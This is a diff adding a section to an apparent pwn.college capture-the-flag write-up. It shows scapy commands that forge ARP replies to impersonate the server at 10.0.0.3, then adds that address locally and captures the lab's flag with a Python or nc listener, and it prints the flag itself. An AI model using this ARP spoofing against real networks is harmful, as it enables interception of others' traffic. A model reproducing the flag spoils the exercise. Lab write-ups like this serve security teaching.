@@ -2351,11 +2351,118 @@ network.run()
 user_host.interactive(environ=parent_process.environ())
 ```
 
+```
+root@ip-10-0-0-1:/# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
+        inet6 fe80::b058:67ff:fea3:8a0a  prefixlen 64  scopeid 0x20<link>
+        ether b2:58:67:a3:8a:0a  txqueuelen 1000  (Ethernet)
+        RX packets 14  bytes 1148 (1.1 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3  bytes 266 (266.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
 
+First, we have to ARP request to `10.0.0.2` and retrieved its MAC address.
+
+```py
+>>> (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.2")).display()
+###[ Ethernet ]###
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = 32:c6:78:97:5b:7e
+  type      = ARP
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = who-has
+     hwsrc     = 32:c6:78:97:5b:7e
+     psrc      = 10.0.0.1
+     hwdst     = 00:00:00:00:00:00
+     pdst      = 10.0.0.2
+```
+
+```py
+>>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.2"), timeout=1).hwsrc
+Begin emission
+
+Finished sending 1 packets
+*
+Received 1 packets, got 1 answers, remaining 0 packets
+'ee:03:45:31:47:c7'
+```
+
+Then we spoof an ARP reply to `10.0.0.2` claiming that we are `10.0.0.3`, the intended server.
 
 ```
-sendp(Ether(src="1e:a8:ee:bd:f7:d4", dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.3", hwsrc="1e:a8:ee:bd:f7:d4", pdst="10.0.0.2", hwdst="ff:ff:ff:ff:ff:ff")), iface="eth0")
+>>> (Ether(dst="ee:03:45:31:47:c7", src="b2:58:67:a3:8a:0a") / ARP(op="is-at", hwsrc="b2:58:67:a3:8a:0a", psrc="10.0.0.3", hwdst="ee:03:45:31:47:c7", pdst="10.0.0.2")).display()
+###[ Ethernet ]###
+  dst       = ee:03:45:31:47:c7
+  src       = b2:58:67:a3:8a:0a
+  type      = ARP
+
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = is-at
+     hwsrc     = b2:58:67:a3:8a:0a
+     psrc      = 10.0.0.3
+     hwdst     = ee:03:45:31:47:c7
+     pdst      = 10.0.0.2
+```
+
+```py
+>>> sendp(Ether(dst="ee:03:45:31:47:c7", src="b2:58:67:a3:8a:0a") / ARP(op="is-at", hwsrc="b2:58:67:a3:8a:0a", psrc="10.0.0.3", hwdst="ee:03:45:31:47:c7", pdst="10.0.0.2"), iface="eth0", count=5)
+.....
+Sent 5 packets.
+```
+
+Now, we have to manually add `10.0.0.3` to our interface so we could receive traffic destined for the spoofed server.
+
+```
+root@ip-10-0-0-1:/# ip addr add 10.0.0.3/24 dev eth0
+```
+
+Finally, we just have to set up a listener and listen for the flag.
+
+```py title="~/script.py" showLineNumbers
+import socket
+
+s = socket.socket()
+s.bind(("10.0.0.3", 31337))
+s.listen(1)
+
+print("[+] Waiting for connection...")
+conn, _ = s.accept()
+flag = conn.recv(1024).decode()
+print(f"[*] Got flag: {flag}")
+```
+
+```
+root@ip-10-0-0-1:/# python ~/script.py
+[=] Waiting for connection...
+[*] Got flag: pwn.college{k6oBuh4NgwdU9ydZFC5jOJDksKR.dFzNzMDL4ITM0EzW}
+```
+
+OR 
+
+```
+root@ip-10-0-0-1:/# nc -lvp 31337 -s 10.0.0.3
+nc: getnameinfo: Temporary failure in name resolution
+nc: getnameinfo: Temporary failure in name resolution
+pwn.college{k6oBuh4NgwdU9ydZFC5jOJDksKR.dFzNzMDL4ITM0EzW}
 ```
 
 &nbsp;
